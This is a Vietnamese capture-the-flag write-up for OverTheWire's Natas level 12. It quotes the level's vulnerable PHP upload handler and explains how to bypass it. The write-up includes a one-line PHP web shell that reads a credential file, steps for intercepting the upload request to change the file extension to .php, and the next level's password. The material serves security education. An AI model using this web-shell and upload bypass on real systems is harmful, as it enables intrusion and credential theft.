# Natas Level 11 → Level 12

Username: natas12

URL: http://natas12.natas.labs.overthewire.org

# Solution

Truy cập website: 

![img](https://github.com/DucThinh47/OverTheWire/blob/main/Natas/images/image58.png?raw=true)

Click View sourcecode: 

![img](https://github.com/DucThinh47/OverTheWire/blob/main/Natas/images/image59.png?raw=true)

Tìm được đoạn mã PHP: 

    <?php

    function genRandomString() {
        $length = 10;
        $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
        $string = "";

        for ($p = 0; $p < $length; $p++) {
            $string .= $characters[mt_rand(0, strlen($characters)-1)];
        }

        return $string;
    }

    function makeRandomPath($dir, $ext) {
        do {
        $path = $dir."/".genRandomString().".".$ext;
        } while(file_exists($path));
        return $path;
    }

    function makeRandomPathFromFilename($dir, $fn) {
        $ext = pathinfo($fn, PATHINFO_EXTENSION);
        return makeRandomPath($dir, $ext);
    }

    if(array_key_exists("filename", $_POST)) {
        $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


            if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
            echo "File is too big";
        } else {
            if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
                echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
            } else{
                echo "There was an error uploading the file, please try again!";
            }
        }
    } else {
    ?>

=> Đoạn code không kiểm tra extension thực sự của file, không kiểm tra MIME type, không chặn thực thi PHP trong thư mục upload, không kiểm tra file upload hợp lệ. 

Tạo payload có dạng sau: 

    <?php
        echo system("cat /etc/natas_webpass/natas13");
    ?>

![img](https://github.com/DucThinh47/OverTheWire/blob/main/Natas/images/image60.png?raw=true)

Thử upload 1 file jpeg hợp lệ và Intercept request này: 

![img](https://github.com/DucThinh47/OverTheWire/blob/main/Natas/images/image61.png?raw=true)

Send request này:

![img](https://github.com/DucThinh47/OverTheWire/blob/main/Natas/images/image62.png?raw=true)

Có vẻ kích thước file vượt quá mức cho phép, thử upload file có kích thước < 1KB:

![img](https://github.com/DucThinh47/OverTheWire/blob/main/Natas/images/image63.png?raw=true)

Send request: 

![img](https://github.com/DucThinh47/OverTheWire/blob/main/Natas/images/image64.png?raw=true)

=> Upload file thành công. 

Lần này thử chọn upload file shell.php: 

![img](https://github.com/DucThinh47/OverTheWire/blob/main/Natas/images/image65.png?raw=true)

Send request: 

![img](https://github.com/DucThinh47/OverTheWire/blob/main/Natas/images/image66.png?raw=true)

=> Tên file bị thay đổi và định dạng thành file .jpg

Upload lại nhưng lần này chỉnh sửa Request: 

![img](https://github.com/DucThinh47/OverTheWire/blob/main/Natas/images/image67.png?raw=true)

=> Đổi extension file mà website tự sinh ra thành .php, forward request này: 

![img](https://github.com/DucThinh47/OverTheWire/blob/main/Natas/images/image68.png?raw=true)

=> Extension của file đã đổi thành .php, click vào tên file này: 

![img](https://github.com/DucThinh47/OverTheWire/blob/main/Natas/images/image69.png?raw=true)

=> Password natas13: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC

